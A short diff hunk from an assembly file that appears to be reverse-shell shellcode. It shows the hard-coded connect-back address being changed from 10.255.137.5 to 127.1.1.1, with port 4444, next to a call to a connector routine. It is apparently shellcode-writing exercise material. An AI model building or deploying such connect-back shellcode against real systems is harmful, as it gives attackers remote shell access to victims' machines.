@@ -124,5 +124,5 @@ shelltime:
 ip_port:
 
 	call connector
-	ip_address:	dd 0x589ff0a		; 10.255.137.5
+	ip_address:	dd 0x101017f		; 127.1.1.1
 	port: 		dw 0x5c11		; 4444 see iptohex.py	
